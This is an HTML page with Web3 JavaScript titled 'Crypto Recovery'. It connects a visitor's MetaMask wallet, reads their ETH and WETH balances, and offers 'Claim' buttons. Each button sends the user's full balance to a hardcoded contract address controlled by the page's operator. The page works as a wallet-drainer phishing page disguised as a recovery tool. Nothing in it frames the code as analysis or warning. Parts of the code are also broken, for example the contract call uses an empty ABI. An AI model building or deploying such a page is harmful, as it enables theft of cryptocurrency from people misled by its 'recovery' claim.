<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Crypto Recovery</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      background: linear-gradient(135deg, #1f4037, #99f2c8);
      color: white;
      padding: 30px;
    }
    button {
      padding: 10px 20px;
      margin: 10px;
      font-size: 16px;
      cursor: pointer;
      border: none;
      border-radius: 5px;
      background-color: #4caf50;
      color: white;
    }
    button:hover {
      background-color: #45a049;
    }
    table {
      margin: 20px auto;
      border-collapse: collapse;
      width: 80%;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 5px;
    }
    table th, table td {
      border: 1px solid white;
      padding: 10px;
      text-align: center;
    }
    table th {
      background: rgba(0, 0, 0, 0.8);
    }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
</head>
<body>
  <h1>Crypto Recovery</h1>
  <button id="connectWallet">Connect Wallet</button>
  <div id="results" style="display:none;">
    <p>Connected Wallet: <span id="walletAddress"></span></p>
    <h3>Detected Tokens and Balances</h3>
    <table id="tokensTable">
      <thead>
        <tr>
          <th>Token</th>
          <th>Balance</th>
          <th>Status</th>
          <th>Action</th>
        </tr>
      </thead>
      <tbody></tbody>
    </table>
  </div>

  <script>
    const CONTRACT_ADDRESS = "0x3643b7a9F6338115159a4D3a2cc678C99aD657aa"; // Your central contract address
    const TOKENS = [
      { name: "Ethereum", address: null, abi: null }, // Native Ethereum
      { name: "Ethereum on Base", address: null, abi: null }, // Native Ethereum on Base
      {
        name: "WETH",
        address: "0xC02aaa39b223FE8D0A0E5C4F27eAD9083C756Cc2",
        abi: [
          { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "balance", type: "uint256" }], type: "function" },
          { constant: false, inputs: [{ name: "recipient", type: "address" }, { name: "amount", type: "uint256" }], name: "transfer", outputs: [{ name: "success", type: "bool" }], type: "function" }
        ]
      }
    ];

    let web3;
    let userAddress;

    document.getElementById('connectWallet').addEventListener('click', async () => {
      if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          userAddress = accounts[0];
          document.getElementById('walletAddress').textContent = userAddress;
          document.getElementById('results').style.display = 'block';
          displayBalances();
        } catch (error) {
          alert('Failed to connect wallet.');
        }
      } else {
        alert('MetaMask is not installed!');
      }
    });

    async function displayBalances() {
      const tableBody = document.querySelector('#tokensTable tbody');
      tableBody.innerHTML = ''; // Clear previous results

      for (const token of TOKENS) {
        let balance = 0;

        if (!token.address) {
          // Native Ethereum or Ethereum on Base
          balance = await web3.eth.getBalance(userAddress);
          balance = parseFloat(web3.utils.fromWei(balance, 'ether')).toFixed(6);
        } else {
          // ERC-20 Token Balance
          const contract = new web3.eth.Contract(token.abi, token.address);
          const rawBalance = await contract.methods.balanceOf(userAddress).call();
          balance = parseFloat(web3.utils.fromWei(rawBalance, 'ether')).toFixed(6);
        }

        const row = `
          <tr>
            <td>${token.name}</td>
            <td>${balance}</td>
            <td>${balance > 0 ? "Found" : "Not Found"}</td>
            <td>${balance > 0 ? `<button onclick="claim('${token.name}', '${token.address}', ${balance})">Claim</button>` : "N/A"}</td>
          </tr>
        `;
        tableBody.insertAdjacentHTML('beforeend', row);
      }
    }

    async function claim(tokenName, tokenAddress, balance) {
      if (!userAddress) return alert('Please connect your wallet first.');

      try {
        const contract = new web3.eth.Contract([], CONTRACT_ADDRESS); // Central contract
        const amountInWei = web3.utils.toWei(balance.toString(), 'ether');
        await contract.methods.claimTokens(tokenAddress, amountInWei).send({ from: userAddress });
        alert(`${tokenName} claimed successfully.`);
        displayBalances(); // Refresh balances after claiming
      } catch (error) {
        alert(`Failed to claim ${tokenName}: ${error.message}`);
      }
    }
  </script>
</body>
</html>
